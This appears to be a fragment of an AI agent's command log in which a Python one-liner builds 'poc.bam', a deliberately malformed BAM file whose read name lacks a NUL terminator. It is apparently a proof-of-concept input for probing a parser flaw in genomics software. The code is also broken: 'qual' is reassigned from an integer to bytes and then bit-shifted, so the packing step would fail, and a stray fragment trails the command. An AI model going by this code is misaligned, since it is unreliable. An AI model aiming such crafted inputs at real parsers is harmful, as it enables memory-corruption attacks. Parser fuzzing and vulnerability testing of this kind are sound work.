message:
Running command: cd /tmp && python3 -c "
import struct

def build_bam():
    out = b''
    # header
    out += b'BAM\x01'
    text = b''
    out += struct.pack('<i', len(text)) + text
    out += struct.pack('<i', 0)  # n_ref
    # record
    tid=0; pos=0; bin=0; qual=0; l_qname=4; flag=0; n_cigar=1; l_qseq=10; mtid=-1; mpos=-1; isize=0
    l_extranul = (4 - l_qname%4)%4
    qname = b'AAAA'  # not NUL terminated
    cigar = struct.pack('<I', (5<<4)|0)  # 5M
    seq = b'\x00'*((l_qseq+1)//2)
    qual = b'\xff'*l_qseq
    block_len = 32 + l_qname + l_extranul + n_cigar*4 + (l_qseq+1)//2 + l_qseq
    core = struct.pack('<8i', tid,pos,(bin<<16)|(qual<<8)|l_qname,(flag<<16)|n_cigar,l_qseq,mtid,mpos,isize)
    out += struct.pack('<i', block_len) + core + qname + b'\x00'*l_extranul + cigar + seq + qual
    return out

data = build_bam()
open('poc.bam','wb').write(data)
print('wrote', len(data), 'bytes')
print(data.hex())
"

- qual: 10
